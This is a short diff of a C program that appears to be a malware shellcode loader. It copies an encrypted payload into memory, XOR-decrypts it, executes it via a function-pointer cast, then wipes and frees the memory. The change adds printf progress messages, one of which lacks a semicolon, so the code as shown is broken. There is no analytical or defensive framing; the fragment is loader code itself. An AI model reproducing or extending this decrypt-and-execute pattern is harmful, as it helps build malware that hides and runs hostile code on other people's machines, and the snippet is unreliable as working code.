@@ -51,18 +51,19 @@ int main() {
 
 
     memcpy(decrypted_payload, encrypted_payload, payload_size);
-
+    printf("%s\n", "copied the encrypted payload to the memory");
 
     xor_decrypt(decrypted_payload, payload_size, key);
+    printf("%s\n", "decrypted the payload");
 
-    
     ((void(*)())decrypted_payload)();
-
+    printf("%s\n", "payload executed");
 
     wipe_memory(decrypted_payload, payload_size);
-
+    printf("%s\n", "memory wiped");
 
     VirtualFree(decrypted_payload, 0, MEM_RELEASE);
+    printf("%s\n", "memory freed")
 
     return 0;
 }
